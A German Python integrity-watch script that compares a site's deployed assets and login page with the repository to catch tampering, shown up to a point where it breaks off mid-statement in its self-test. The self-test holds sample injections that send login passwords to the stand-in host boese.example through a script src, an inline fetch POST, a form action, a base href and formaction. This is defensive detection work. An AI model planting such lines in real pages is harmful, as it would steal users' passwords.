#!/usr/bin/env python3
"""Integritaetswache — laeuft die ausgelieferte Fassung noch der aus?

    python3 tools/integritaetswache/wache.py [basisadresse]
    python3 tools/integritaetswache/wache.py --selbstprobe

Rueckgabewert 0 = kein Unterschied, 1 = mindestens einer (oder etwas war nicht
erreichbar), 2 = die Wache selbst ist kaputt.

WOGEGEN SIE GEBAUT IST (SP-6, F-SP-9, Backlog Nr. 140)
Der eine Angriff, gegen den keine Verschluesselung im Browser hilft, ist ein
Server, der VERAENDERTEN CODE ausliefert: eine Zeile in `crypto.js`, und das
naechste Passwort geht mit. VERHINDERN laesst sich das nur durch Zugangsschutz
(Branch-Schutz, 2FA, R67). ERKENNEN laesst es sich hier -- und darum geht es.

WAS SIE ERKENNT: eine per FTP oder Hoster-Panel veraenderte Auslieferung. Das
ist der wahrscheinlichste Weg, denn die FTPS-Zugangsdaten liegen als
GitHub-Secret und der Webspace hat ein Panel.

WAS SIE NICHT ERKENNT: einen Angreifer mit Push-Recht -- der aendert beides,
Repositorium und Auslieferung, und die Wache saehe zwei gleiche Summen.
Dagegen steht SP-4. Ebenso wenig sieht sie PHP-Code, der nicht ausgeliefert
wird; von ihm faengt sie genau den Teil, der Passwoerter beruehrt (den
Inline-Block der Anmeldeseite, siehe unten).

WARUM SIE OHNE EINGECHECKTE ERWARTUNGSSUMME AUSKOMMT
Der Deploy (`.github/workflows/deploy.yml`) synchronisiert `server/` byteweise
per FTPS. Was unter `assets/` liegt, ist auf dem Server also dieselbe Datei wie
im Repositorium -- der Vergleich braucht keine gepflegte Liste von
Pruefsummen, die nach der dritten Aenderung nicht mehr stimmt. Er rechnet beide
Seiten frisch aus.

Fuer die Anmeldeseite gilt dasselbe, und das war beim Bauen die offene Frage:
Der Inline-Skriptblock von `login.php` enthaelt KEINE einzige PHP-Einsetzung
(nachgezaehlt am 07.09.2026: 0). Er steht als Literal in der Quelle und kommt
byteweise so beim Browser an. Gemessen: derselbe SHA-256 aus der Quelldatei und
aus zwei aufeinanderfolgenden Abrufen. Ein Block MIT PHP darin waere nicht
vergleichbar -- die Wache sagt das dann und zaehlt ihn getrennt, statt ihn
stillschweigend zu uebergehen.

WAS AUF DER ANMELDESEITE ZAEHLT, IST DER WEG DES PASSWORTS -- und der hat
genau zwei Enden: die Skripte, die es lesen, und das Formular, das es
abschickt. Die erste Fassung dieser Wache pruefte nur, ob der bekannte
Inline-Block VORHANDEN ist. Ein ZUSAETZLICHES Skript -- eingeschleust ueber
`ui.php`, ueber `auto_prepend_file` in einer veraenderten `.htaccess`, ueber
einen zweiten <script src> -- fiel ihr nicht auf, und ein Formular mit
fremdem `action` auch nicht. Beides kostet den Angreifer eine Zeile und
schickt das Passwort beim naechsten Anmelden mit. Deshalb vergleicht sie
die GANZE Menge: jeden <script src>, jeden Inline-Block, jedes <form>-Tag.
Was in der Auslieferung steht und in der Quelle nicht, ist eine Abweichung.

HTML KENNT ZWEI WEITERE STELLEN, die den Weg bestimmen, ohne dass ein Skript
oder das <form>-Tag sich aendert (Gegenpruefung vom 07.09.2026, Fund 17): Ein
<base href="https://boese.example/"> im Kopf loest JEDEN relativen Verweis der
Seite dorthin auf -- `src="assets/crypto.js?v=…"` bleibt byteidentisch und
laedt trotzdem fremden Code. Und `formaction=` am Absendeknopf ueberstimmt das
`action` des Formulars -- das <form>-Tag bleibt byteidentisch, das Passwort
geht trotzdem woandershin. Je eine Zeile, beide ohne JavaScript, beide gingen
gruen durch. Deshalb gehoeren <base>-Tags und die vier Umlenk-Attribute
(`formaction`, `formmethod`, `formtarget`, `formenctype`) mit zur Menge. Die
Absendeknoepfe selbst werden NICHT als Tags verglichen: Der Knopf der
Anmeldeseite kommt aus `ui_knopf()` in `ui.php`, nicht aus der Quelle
`login.php` -- ein Tagvergleich braeuchte eine Nachbildung von `ui_knopf()`,
und jede Nachbildung ist eine zweite Stelle, die veraltet. Das Attribut ist
die Stelle, an der der Angriff steht; das Attribut wird verglichen.

UND VIER WEITERE (zweite Gegenpruefung, 07.09.2026): Ein Skriptverweis OHNE
Anfuehrungszeichen (`<script src=https://boese.example/x.js>`) war fuer die
Wache weder Inline-Block noch Fremdskript -- das Muster verlangte
Anfuehrungszeichen, und HTML tut das nicht. Ein Ereignisattribut
(`<input name="password" onkeyup="…">`, `<body onload="…">`) ist JavaScript
ohne <script>-Tag. Ein `<meta http-equiv="refresh">` lenkt die ganze Seite
ohne Skript um, und ein <iframe>, <object> oder <embed> holt fremden Inhalt
in die Seite -- `srcdoc` sogar mit demselben Ursprung, also mit Zugriff auf
das Passwortfeld. Dazu `javascript:`-Adressen in einem Attribut. Alle fuenf
gingen gruen durch; alle fuenf gehoeren jetzt zur Menge. Was NICHT dazu
gehoert und warum, steht in der LIESMICH unter Grenzen: Ein Stylesheet liest
kein Passwortfeld -- der Wert eines <input> steht in keinem Attribut, das
ein CSS-Selektor sehen koennte.
"""
from __future__ import annotations

import hashlib
import html
import http.client
import os
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

WURZEL = Path(__file__).resolve().parents[2]
SERVER = WURZEL / 'server'

VORGABE_BASIS = os.environ.get('WACHE_BASIS') or 'https://nadoku.gen-em.org'

# Was unter `assets/` NICHT ausgeliefert wird oder nicht ausgeliefert werden
# muss. `.md` ist Begleittext des Repositoriums.
NICHT_PRUEFEN = {'.md'}

# Seiten, deren Inline-Skriptbloecke verglichen werden. Nur unangemeldet
# erreichbare -- die Wache hat keine Zugangsdaten und soll keine bekommen.
SEITEN = ['login.php']

# Ein Attributname beginnt nach Leerraum, nicht nach einem Bindestrich: `\bsrc`
# traf auch `data-src` -- die Wortgrenze liegt am Bindestrich --, und ein
# <script data-src="x">…</script> galt damit als Fremdskript "x" statt als
# Inline-Block; sein Inhalt wurde nie verglichen (Fund 22). `(?<![\w-])`
# verlangt, dass vor `src` weder Buchstabe, Ziffer noch Bindestrich steht.
SKRIPT_RE = re.compile(r'<script\b(?![^>]*(?<![\w-])src\s*=)[^>]*>(.*?)</script\s*>', re.I | re.S)
# Der Wert darf `>` und das jeweils andere Anfuehrungszeichen enthalten: In der
# Quelle steht `src="<?= asset('assets/crypto.js') ?>"`. Ein Muster, das am
# ersten inneren Anfuehrungszeichen abbricht, hielte dieses Skript fuer
# unbestimmbar -- und liesse dann JEDEN Ersatz dafuer durch. So war die erste
# Fassung, und die Selbstprobe hat es gefunden.
# Und der Wert darf OHNE Anfuehrungszeichen stehen (`src=x.js`): HTML erlaubt
# das, und die zweite Gegenpruefung fand, dass ein solcher Verweis weder als
# Fremdskript noch als Inline-Block zaehlte -- er war unsichtbar.
SRC_RE    = re.compile(r'<script\b[^>]*?(?<![\w-])src\s*=\s*(?:"([^"]*)"|\'([^\']*)\'|([^\s>]+))', re.I | re.S)
FORM_RE   = re.compile(r'<form\b[^>]*>', re.I)
# <base> lenkt jeden relativen Verweis der Seite um, die vier form*-Attribute
# den Absendeweg des Formulars -- siehe Kopf der Datei. Das Umlenk-Attribut
# wird samt Wert verglichen, gleich an welchem Tag es steht.
BASE_RE   = re.compile(r'<base\b[^>]*>', re.I)
UMLENK_RE = re.compile(r'(?<![\w-])form(?:action|method|target|enctype)\s*=\s*'
                       r'(?:"[^"]*"|\'[^\']*\'|[^\s>]*)', re.I)
# Vier weitere Stellen, die den Weg des Passworts bestimmen, ohne <script>-Tag
# und ohne <form>-Aenderung (zweite Gegenpruefung, 07.09.2026; Kopf der
# Datei): Kopfanweisungen (`<meta http-equiv>`, etwa `refresh`), Einbettungen
# (<iframe>, <frame>, <object>, <embed>), Ereignisattribute (`onload=`,
# `onkeyup=` -- JavaScript ohne <script>) und `javascript:`-Adressen in einem
# Attribut. Die Attributmuster laufen ueber den Text OHNE Skriptinhalte
# (`ohne_skriptinhalt()`): `x.onclick = …` in einem Skript ist Code, kein
# Attribut, und der Skriptinhalt wird ohnehin als Block verglichen.
META_RE    = re.compile(r'<meta\b[^>]*(?<![\w-])http-equiv\s*=[^>]*>', re.I)
EINBETT_RE = re.compile(r'<(?:iframe|frame|object|embed)\b[^>]*>', re.I)
HANDLER_RE = re.compile(r'(?<![\w-])on[a-z]+\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^\s>]*)', re.I)
# Fuer javascript:-Adressen reicht kein Muster ueber den rohen Text: Der
# Browser dekodiert Entitaeten im Attributwert (`&#106;avascript:`) und
# wirft Tabulator, Zeilenumbruch und fuehrende Steuerzeichen aus dem Schema
# (`java\tscript:`) -- beides fuehrt Skript aus und stand fuer ein Muster
# auf dem rohen Text nicht da. `jsadressen()` liest deshalb jedes Attribut
# aus jedem Tag, dekodiert und bereinigt es so wie der Browser und prueft
# dann erst das Schema.
TAG_RE     = re.compile(r'<[a-z][^>]*>', re.I | re.S)
ATTR_RE    = re.compile(r'([^\s"\'=<>/]+)\s*=\s*(?:"([^"]*)"|\'([^\']*)\'|([^\s>]+))', re.S)
ASSET_RE  = re.compile(r"asset\(\s*'([^']+)'\s*\)")
# PHP beginnt mit `<?php` oder `<?=` -- nur diese beiden Oeffner benutzt die
# Anwendung. Ein blosses `<?` ist auch JavaScript (`if (a<?0)`) und machte
# einen solchen Block "nicht vergleichbar": Er fiel still aus dem Vergleich,
# und der Lauf blieb gruen (Fund 22).
PHP_RE    = re.compile(r'<\?(?:php\b|=)')

# Was beim Holen schiefgehen kann und EINE Zeile "nicht erreichbar" ergeben
# soll, nicht den Abbruch des ganzen Laufs. URLError und HTTPError sind
# OSError; http.client.InvalidURL und IncompleteRead sind HTTPException und
# KEIN OSError; UnicodeEncodeError ist ein ValueError. Die beiden letzten
# Gruppen fing die erste Fassung nicht: Ein Dateiname mit Leerzeichen oder
# Umlaut (Fund 21) oder eine abgerissene Uebertragung liess die Wache mit
# Rueckgabewert 2 aussteigen -- mitten in der sortierten Liste, und alle
# Dateien danach blieben ungeprueft, ohne dass die Ausgabe es sagte.
HOLFEHLER = (OSError, ValueError, http.client.HTTPException)


def ist_php(text: str) -> bool:
    return PHP_RE.search(text) is not None


def url_fuer(basis: str, rel: str) -> str:
    """Basis plus seitenrelativer Pfad, prozentkodiert. Roh eingesetzt wirft
    ein Leerzeichen im Dateinamen http.client.InvalidURL und ein Umlaut
    UnicodeEncodeError (Fund 21). `/` bleibt Trenner; `?`, `#` und `%` werden
    kodiert -- ein Dateiname ist kein Abfrageteil."""
    return basis.rstrip('/') + '/' + urllib.parse.quote(rel, safe='/')


def src_wert(m: re.Match) -> str:
    """Der Wert eines SRC_RE-Treffers, gleich ob doppelt, einfach oder gar
    nicht in Anfuehrungszeichen."""
    return next(g for g in m.groups() if g is not None)


def ohne_skriptinhalt(text: str) -> str:
    """Der Text ohne die Inhalte der Inline-Bloecke -- fuer die Attributmuster,
    damit `x.onclick = …` im Skript nicht als Ereignisattribut zaehlt."""
    return SKRIPT_RE.sub(lambda m: m.group(0)[:m.start(1) - m.start(0)] + m.group(0)[m.end(1) - m.start(0):], text)


def jsadressen(text: str) -> list[str]:
    """Jedes Attribut, dessen Wert -- dekodiert und bereinigt wie im Browser --
    mit `javascript:` beginnt, als `name=wert`. Der Text kommt ohne
    Skriptinhalte (`ohne_skriptinhalt()`)."""
    raus = []
    for t in TAG_RE.finditer(text):
        for a in ATTR_RE.finditer(t.group(0)):
            wert = next(g for g in a.groups()[1:] if g is not None)
            schema = html.unescape(wert).lstrip(' \t\n\r\x00-\x1f')
            schema = re.sub(r'[\t\n\r]', '', schema)[:11].lower()
            if schema == 'javascript:':
                raus.append(f'{a.group(1).lower()}={wert[:60]}')
    return raus


def normalisiere_src(src: str) -> str:
    """Pfad ohne Abfrageteil und ohne fuehrendes ./ oder / -- `asset()` haengt
    den Zeitstempel der Datei an, und der unterscheidet sich je Ablage."""
    src = src.split('?', 1)[0].split('#', 1)[0].strip()
    while src.startswith('./'):
        src = src[2:]
    return src.lstrip('/')


def quell_srcs(quelle: str) -> tuple[list[str], int]:
    """Die externen Skripte, wie die Quelle sie nennt. `<?= asset('x') ?>` wird
    aufgeloest; ein anderer PHP-Ausdruck ist nicht bestimmbar und wird gezaehlt."""
    raus, unbestimmt = [], 0
    for m in SRC_RE.finditer(quelle):
        roh = src_wert(m)
        if ist_php(roh):
            a = ASSET_RE.search(roh)
            if a:
                raus.append(normalisiere_src(a.group(1)))
            else:
                unbestimmt += 1
        else:
            raus.append(normalisiere_src(roh))
    return raus, unbestimmt


def tags(muster: re.Pattern, text: str) -> list[str]:
    """Alle Treffer eines Musters, Leerraum auf je ein Zeichen gebracht."""
    return [re.sub(r'\s+', ' ', m.group(0)).strip() for m in muster.finditer(text)]


def menge_vergleichen(seite: str, was: str, soll: list[str], ist: list[str]) -> tuple[list[str], int, int]:
    """Vergleicht eine Menge von Tags oder Attributen in beide Richtungen.

    Jedes PHP-freie Stueck der Quelle muss in der Auslieferung stehen, und die
    Auslieferung darf nicht MEHR davon haben, als die Quelle hat. Ein Stueck
    der Quelle MIT PHP darin ist nicht bestimmbar; fuer jedes davon darf in
    der Auslieferung eines stehen, das die Quelle nicht kennt -- aber nicht
    mehr. Liefert die Abweichungen, die Zahl der gleichen und die der
    unbestimmten Stuecke.
    """
    ab: list[str] = []
    rein = [s for s in soll if not ist_php(s)]
    unbestimmt = len(soll) - len(rein)
    rest = list(ist)
    gleich = 0
    for s in rein:
        if s in rest:
            gleich += 1
            rest.remove(s)
        else:
            ab.append(f'{seite}: {was} fehlt oder steht anders in der Auslieferung: {s[:60]}')
    for s in rest[unbestimmt:]:
        ab.append(f'{seite}: ZUSAETZLICHES oder veraendertes {was} in der Auslieferung: {s[:80]}')
    return ab, gleich, unbestimmt


def seite_vergleichen(seite: str, quelle: str, geliefert: str) -> tuple[list[str], dict]:
    """Vergleicht die Auslieferung einer Seite mit ihrer Quelle.

    Liefert die Abweichungen und die Zahlen, die dazu gehoeren. Verglichen
    wird die GANZE Menge der Skripte, Formulare, <base>-Tags, Umlenk- und
    Ereignisattribute, Kopfanweisungen, Einbettungen und javascript:-Adressen,
    nicht nur das Vorhandensein des Bekannten -- siehe Kopf der Datei.
    """
    ab: list[str] = []
    z = {'inline_gleich': 0, 'inline_php': 0, 'src_gleich': 0, 'src_unbestimmt': 0,
         'form_gleich': 0, 'base_ist': 0, 'umlenk_ist': 0, 'meta_ist': 0,
         'einbett_ist': 0, 'handler_ist': 0, 'jsurl_ist': 0}

    # -- Inline-Bloecke: die PHP-freien der Quelle muessen da sein, und es
    #    duerfen nicht MEHR sein als die Quelle hat.
    soll_alle = bloecke(quelle)
    soll_rein = [b for b in soll_alle if not ist_php(b)]
    z['inline_php'] = len(soll_alle) - len(soll_rein)
    ist_bloecke = bloecke(geliefert)
    ist_summen = [sha(b.encode()) for b in ist_bloecke]
    for b in soll_rein:
        h = sha(b.encode())
        if h in ist_summen:
            z['inline_gleich'] += 1
            ist_summen.remove(h)
        else:
            ab.append(f'{seite}: ein Inline-Block der Quelle steht nicht so in der '
                      f'Auslieferung (erwartet {h[:16]}…, {len(b)} Zeichen)')
    zusatz = len(ist_bloecke) - len(soll_alle)
    if zusatz > 0:
        ab.append(f'{seite}: {zusatz} ZUSAETZLICHE(R) Inline-Block(e) in der Auslieferung, '
                  f'die die Quelle nicht hat')
    elif zusatz < 0:
        ab.append(f'{seite}: {-zusatz} Inline-Block(e) der Quelle fehlen in der Auslieferung')

    # -- Externe Skripte: dieselbe Menge, kein Verweis mehr und keiner weniger.
    soll_src, z['src_unbestimmt'] = quell_srcs(quelle)
    ist_src = [normalisiere_src(src_wert(m)) for m in SRC_RE.finditer(geliefert)]
    for src in soll_src:
        if src in ist_src:
            z['src_gleich'] += 1
            ist_src.remove(src)
        else:
            ab.append(f'{seite}: das Skript {src} fehlt in der Auslieferung')
    # Was die Quelle nicht bestimmen kann, darf in der Auslieferung stehen --
    # aber nur so viele, wie es unbestimmte gibt.
    for src in ist_src[z['src_unbestimmt']:]:
        ab.append(f'{seite}: ZUSAETZLICHES Skript in der Auslieferung: {src}')

    # -- Formulare: die Tags selbst, samt Attributen. Ein fremdes `action`
    #    schickte das Passwort woandershin, ohne dass ein Skript sich aendert.
    a, z['form_gleich'], _ = menge_vergleichen(seite, 'Formular',
                                               tags(FORM_RE, quelle), tags(FORM_RE, geliefert))
    ab.extend(a)

    # -- <base> und Umlenk-Attribute: In der Quelle gibt es heute keines von
    #    beiden; steht eines in der Auslieferung, ist es zu viel. Gezaehlt
    #    wird, was die Auslieferung hat -- die Zahl gehoert in die Ausgabe,
    #    damit "0" dort als Messwert steht und nicht als Schweigen.
    ist_base = tags(BASE_RE, geliefert)
    z['base_ist'] = len(ist_base)
    a, _, _ = menge_vergleichen(seite, '<base>-Tag', tags(BASE_RE, quelle), ist_base)
    ab.extend(a)
    q_ohne, g_ohne = ohne_skriptinhalt(quelle), ohne_skriptinhalt(geliefert)
    ist_umlenk = tags(UMLENK_RE, g_ohne)
    z['umlenk_ist'] = len(ist_umlenk)
    a, _, _ = menge_vergleichen(seite, 'Umlenk-Attribut', tags(UMLENK_RE, q_ohne), ist_umlenk)
    ab.extend(a)

    # -- Kopfanweisungen, Einbettungen, Ereignisattribute, javascript:-Adressen
    #    (zweite Gegenpruefung): dieselbe Rechnung, dieselbe Ausgabe.
    for was, muster, schluessel in (('Kopfanweisung (http-equiv)', META_RE, 'meta_ist'),
                                    ('Einbettung (iframe/object/embed)', EINBETT_RE, 'einbett_ist'),
                                    ('Ereignisattribut (on…=)', HANDLER_RE, 'handler_ist')):
        ist = tags(muster, g_ohne)
        z[schluessel] = len(ist)
        a, _, _ = menge_vergleichen(seite, was, tags(muster, q_ohne), ist)
        ab.extend(a)
    ist_js = jsadressen(g_ohne)
    z['jsurl_ist'] = len(ist_js)
    a, _, _ = menge_vergleichen(seite, 'javascript:-Adresse', jsadressen(q_ohne), ist_js)
    ab.extend(a)
    return ab, z


def sha(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def hole(url: str, unsicher: bool = False) -> bytes:
    ctx = None
    if unsicher:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    anfrage = urllib.request.Request(url, headers={'User-Agent': 'nadoku-integritaetswache'})
    with urllib.request.urlopen(anfrage, timeout=30, context=ctx) as antwort:
        return antwort.read()


def bloecke(text: str) -> list[str]:
    return [m.group(1) for m in SKRIPT_RE.finditer(text)]


def assets() -> list[Path]:
    ordner = SERVER / 'assets'
    raus = [p for p in sorted(ordner.rglob('*'))
            if p.is_file() and p.suffix.lower() not in NICHT_PRUEFEN]
    return raus


def lauf(basis: str, unsicher: bool) -> int:
    basis = basis.rstrip('/')
    print(f'Integritaetswache gegen {basis}')
    abweichung: list[str] = []
    unerreichbar: list[str] = []

    # ---- Teil 1: die ausgelieferten Dateien ------------------------------
    dateien = assets()
    gleich = 0
    for p in dateien:
        rel = p.relative_to(SERVER).as_posix()
        try:
            geliefert = hole(url_fuer(basis, rel), unsicher)
        except HOLFEHLER as ex:
            unerreichbar.append(f'{rel}: {ex}')
            continue
        soll, ist = sha(p.read_bytes()), sha(geliefert)
        if soll == ist:
            gleich += 1
        else:
            abweichung.append(f'{rel}: erwartet {soll[:16]}… ({p.stat().st_size} B), '
                              f'geliefert {ist[:16]}… ({len(geliefert)} B)')

    print(f'  Teil 1  {len(dateien)} Dateien unter assets/ — {gleich} gleich, '
          f'{len(abweichung)} abweichend, {len(unerreichbar)} nicht erreichbar')

    # ---- Teil 2: die Seiten, auf denen das Passwort getippt wird ----------
    summe = {'inline_gleich': 0, 'inline_php': 0, 'src_gleich': 0,
             'src_unbestimmt': 0, 'form_gleich': 0, 'base_ist': 0, 'umlenk_ist': 0,
             'meta_ist': 0, 'einbett_ist': 0, 'handler_ist': 0, 'jsurl_ist': 0}
    for seite in SEITEN:
        quelle = (SERVER / seite)
        if not quelle.is_file():
            unerreichbar.append(f'{seite}: fehlt im Repositorium')
            continue
        try:
            geliefert = hole(url_fuer(basis, seite), unsicher).decode('utf-8', 'replace')
        except HOLFEHLER as ex:
            unerreichbar.append(f'{seite}: {ex}')
            continue
        ab, z = seite_vergleichen(seite, quelle.read_text(encoding='utf-8'), geliefert)
        abweichung.extend(ab)
        for k in summe:
            summe[k] += z[k]

    zuviel = sum(1 for a in abweichung if 'ZUSAETZLICH' in a)
    print(f"  Teil 2  {len(SEITEN)} Seite(n) — {summe['inline_gleich']} Inline-Bloecke gleich "
          f"({summe['inline_php']} nicht vergleichbar, PHP darin), "
          f"{summe['src_gleich']} externe Skripte gleich "
          f"({summe['src_unbestimmt']} unbestimmt), {summe['form_gleich']} Formulare gleich, "
          f"{summe['base_ist']} <base>-Tag(s), {summe['umlenk_ist']} Umlenk-Attribut(e), "
          f"{summe['meta_ist']} Kopfanweisung(en), {summe['einbett_ist']} Einbettung(en), "
          f"{summe['handler_ist']} Ereignisattribut(e) und {summe['jsurl_ist']} javascript:-Adresse(n) "
          f"in der Auslieferung; "
          + ('nichts davon zu viel' if zuviel == 0
             else f'{zuviel} ZU VIEL oder veraendert'))

    if unerreichbar:
        print('\n  NICHT ERREICHBAR:')
        for z in unerreichbar:
            print(f'    {z}')
    if abweichung:
        print('\n  ABWEICHUNG:')
        for z in abweichung:
            print(f'    {z}')
        print('\n  Die ausgelieferte Fassung ist nicht die des Repositoriums.')
        print('  Das kann ein vergessener Deploy sein — oder eine Manipulation.')
        print('  Was zu tun ist, steht in tools/integritaetswache/LIESMICH.md.')
    if not abweichung and not unerreichbar:
        print('\n  Kein Unterschied.')
    return 1 if (abweichung or unerreichbar) else 0


def selbstprobe() -> int:
    """Erkennt die Wache eine Abweichung ueberhaupt? (Backlog Nr. 140)

    Ohne diese Probe ist ein gruener Lauf eine Zahl ohne Aussage: Eine Wache,
    die IMMER gruen meldet, sieht genauso aus wie eine, die nichts findet.
    Sie rechnet ohne Netz: Auch die beiden Holfehler unten entstehen beim
    Zusammenbauen der Anfrage, vor jeder Verbindung.
    """
    print('Selbstprobe der Integritaetswache')
    erwartungen = 0
    offen = 0

    def pruefe(ok: bool, was: str, wert: str = '') -> None:
        nonlocal erwartungen, offen
        erwartungen += 1
        if not ok:
            offen += 1
        print(f'  [{"ok " if ok else "FEHL"}] {was:<66} {wert}')

    # Die Gegenbeweise haengen an keinem Wort der Quelle (Fund 20). Die erste
    # Fassung schrieb `roh.replace(b'const EdCrypto', …)`: Eine Umbenennung in
    # crypto.js oder login.php machte die Ersetzung zum Leerlauf, vier
    # Erwartungen wurden rot, und der taegliche Lauf fiel, ohne dass an der
    # Auslieferung etwas war -- bei einer Wache, deren einziger Kanal die
    # Actions-Benachrichtigung ist, der schnellste Weg dahin, dass niemand
    # mehr hinsieht. Deshalb: ein Bit kippen, einen Kommentar anhaengen, ein
    # Attribut an das erste Tag setzen. Das geht in jeder Datei, wie immer
    # ihre Bezeichner heissen.
    def kippe(b: bytes) -> bytes:
        i = len(b) // 2
        return b[:i] + bytes([b[i] ^ 0x01]) + b[i + 1:]

    def verlaengere(block: str) -> str:
        return block + '/*x*/'

    def umlenke(html: str) -> str:
        return FORM_RE.sub(lambda m: m.group(0)[:-1] + ' action="https://boese.example/">',
                           html, count=1)

    def anhaengen(html: str, stueck: str) -> str:
        return (html.replace('</body>', stueck + '</body>', 1) if '</body>' in html
                else html + stueck)

    d = assets()
    pruefe(len(d) > 0, 'Es gibt Dateien unter assets/ zu vergleichen', f'{len(d)} Dateien')

    # 1. Gleiche Bytes -> gleiche Summe.
    beispiel = SERVER / 'assets' / 'crypto.js'
    pruefe(beispiel.is_file(), 'assets/crypto.js liegt im Repositorium',
           f'{beispiel.stat().st_size if beispiel.is_file() else 0} B')
    roh = beispiel.read_bytes()
    pruefe(sha(roh) == sha(bytes(roh)), 'Gleiche Bytes ergeben dieselbe Summe',
           sha(roh)[:16] + '…')

    # 2. EIN veraendertes Bit -> andere Summe. Das ist die eigentliche Frage.
    manipuliert = kippe(roh)
    pruefe(manipuliert != roh and len(manipuliert) == len(roh),
           'Die Probe konnte ein Byte kippen (Laenge unveraendert)',
           f'{len(roh)} B, Byte {len(roh) // 2} gekippt')
    pruefe(sha(manipuliert) != sha(roh),
           'ABWEICHUNG ERKANNT: eine veraenderte Auslieferung faellt auf',
           f'{sha(roh)[:12]}… gegen {sha(manipuliert)[:12]}…')

    # 3. Der Inline-Block der Anmeldeseite ist ueberhaupt vergleichbar.
    quelle = (SERVER / 'login.php').read_text(encoding='utf-8')
    bl = bloecke(quelle)
    rein = [b for b in bl if not ist_php(b)]
    pruefe(len(rein) >= 1,
           'Die Anmeldeseite hat mindestens einen PHP-freien Inline-Block',
           f'{len(bl)} Bloecke, davon {len(rein)} ohne PHP')
    if rein:
        veraendert = verlaengere(rein[0])
        pruefe(sha(veraendert.encode()) != sha(rein[0].encode()),
               'ABWEICHUNG ERKANNT: ein veraenderter Inline-Block faellt auf',
               f'{sha(rein[0].encode())[:12]}… gegen {sha(veraendert.encode())[:12]}…')
    pruefe(kippe(b'\x00\x00') != b'\x00\x00' and verlaengere('') == '/*x*/'
           and umlenke('<form>') == '<form action="https://boese.example/">',
           'Die Gegenbeweise brauchen kein Ankerwort aus der Quelle',
           'Bit kippen, Kommentar anhaengen, Attribut setzen')

    # 4. Die GANZE Menge, nicht nur das Vorhandensein (die Luecke der ersten
    #    Fassung). Eine Auslieferung wird nachgestellt: `<?= asset('x') ?>`
    #    wird zu `x?v=1`, uebriges PHP faellt weg -- Skripte und Formulare
    #    stehen danach so da, wie der Server sie schickt.
    def nachgestellt(q: str) -> str:
        q = re.sub(r"<\?=\s*asset\('([^']+)'\)\s*\?>", r'\1?v=1', q)
        return re.sub(r'<\?(?:php\b|=).*?\?>', '', q, flags=re.S)

    sim = nachgestellt(quelle)
    ab0, z0 = seite_vergleichen('login.php', quelle, sim)
    pruefe(ab0 == [] and z0['src_gleich'] >= 1 and z0['form_gleich'] >= 1,
           'Quelle gegen nachgestellte Auslieferung: kein Unterschied',
           f"{z0['inline_gleich']} Block, {z0['src_gleich']} Skript, {z0['form_gleich']} Formular, "
           f"{len(ab0)} Abweichungen")

    ab1, _ = seite_vergleichen('login.php', quelle,
                               anhaengen(sim, '<script src="https://boese.example/x.js"></script>'))
    pruefe(any('ZUSAETZLICHES Skript' in a for a in ab1),
           'ABWEICHUNG ERKANNT: ein zusaetzliches <script src> faellt auf',
           '; '.join(ab1)[:90])

    ab2, _ = seite_vergleichen('login.php', quelle,
                               anhaengen(sim, '<script>fetch("https://boese.example/", {method:"POST"})</script>'))
    pruefe(any('ZUSAETZLICHE' in a and 'Inline' in a for a in ab2),
           'ABWEICHUNG ERKANNT: ein zusaetzlicher Inline-Block faellt auf',
           '; '.join(ab2)[:90])

    sim3 = umlenke(sim)
    ab3, _ = seite_vergleichen('login.php', quelle, sim3)
    pruefe(sim3 != sim and any('Formular' in a for a in ab3),
           'ABWEICHUNG ERKANNT: ein fremdes action= am Anmeldeformular faellt auf',
           '; '.join(ab3)[:90])

    sim4 = sim.replace(rein[0], verlaengere(rein[0]), 1) if rein else sim
    ab4, _ = seite_vergleichen('login.php', quelle, sim4)
    pruefe(sim4 != sim and any('Inline-Block der Quelle steht nicht so' in a for a in ab4),
           'ABWEICHUNG ERKANNT: ein veraenderter Inline-Block faellt auf (ganze Menge)',
           '; '.join(ab4)[:90])

    # 5. Die beiden Stellen ohne Skript und ohne <form>-Aenderung (Fund 17):
    #    <base href> laesst jeden relativen Verweis woanders aufloesen,
    #    formaction= am Knopf ueberstimmt das action des Formulars. In beiden
    #    Faellen bleiben Skriptverweis und <form>-Tag byteidentisch.
    ab5, _ = seite_vergleichen('login.php', quelle, '<base href="https://boese.example/">' + sim)
    pruefe(any('ZUSAETZLICH' in a and '<base>' in a for a in ab5),
           'ABWEICHUNG ERKANNT: ein <base href> in der Auslieferung faellt auf',
           '; '.join(ab5)[:90])

    knopf = '<button type="submit" formaction="https://boese.example/">Anmelden</button>'
    sim6 = sim.replace('</form>', knopf + '</form>', 1) if '</form>' in sim else sim + knopf
    ab6, _ = seite_vergleichen('login.php', quelle, sim6)
    pruefe(any('ZUSAETZLICH' in a and 'Umlenk' in a for a in ab6),
           'ABWEICHUNG ERKANNT: ein formaction= am Absendeknopf faellt auf',
           '; '.join(ab6)[:90])

    # 6. Ein Dateiname, der nicht in eine rohe Adresse passt (Fund 21): Der
    #    Pfad wird kodiert, und was beim Holen trotzdem schiefgeht, wird EINE
    #    Zeile, kein Abbruch. Die beiden Holfehler unten entstehen beim
    #    Zusammenbauen der Anfrage -- vor jeder Verbindung, ohne Netz.
    pruefe(url_fuer('http://h', 'assets/mit leer.css') == 'http://h/assets/mit%20leer.css'
           and url_fuer('http://h/', 'assets/übung.css') == 'http://h/assets/%C3%BCbung.css',
           'Ein Dateiname mit Leerzeichen oder Umlaut ergibt eine gueltige Adresse',
           url_fuer('http://h', 'assets/mit leer.css'))

    def holfehler(url: str) -> str:
        try:
            hole(url)
        except HOLFEHLER as ex:
            return f'gefangen ({type(ex).__name__})'
        except Exception as ex:                   # noqa: BLE001 -- genau das wird gemessen
            return f'NICHT gefangen ({type(ex).__name__})'
        return 'kein Fehler'

    f1 = holfehler('http://127.0.0.1:9/assets/mit leer.css')
    f2 = holfehler('http://127.0.0.1:9/assets/übung.css')
    pruefe(f1.startswith('gefangen') and f2.startswith('gefangen'),
           'Ein Holfehler wird eine Zeile "nicht erreichbar", kein Abbruch',
           f'{f1}, {f2}')

    # 7. Die Extraktion sondert nichts still aus (Fund 22).
    probe = '<script data-src="x">echt</script>'
    pruefe(bloecke(probe) == ['echt'] and SRC_RE.search(probe) is None
           and SRC_RE.search('<script src="x"></script>') is not None,
           'Ein <script data-src=…> ist ein Inline-Block, kein Fremdskript',
